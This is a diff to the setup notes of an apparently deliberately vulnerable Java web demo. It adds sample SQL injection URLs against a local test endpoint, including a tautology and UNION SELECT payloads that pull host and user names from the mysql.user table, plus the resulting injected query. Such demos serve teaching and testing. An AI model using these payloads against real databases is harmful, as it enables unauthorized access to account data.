@@ -1,3 +1,10 @@
 copy settings.xml to .m2
 mvn clean install
 mvn jetty:run
+
+Try this:
+http://localhost:8080/test?name=provider 1' or '1' = '1
+http://localhost:8080/test?name=provider 1' UNION SELECT Host, User FROM mysql.user where '1' = '1
+http://localhost:8080/test?name=provider 1' union select 1, User from mysql.user where '1' = '1
+
+select id, name from providers where name = 'provider 1' union select Host, User from mysql.user where '1' = '1';
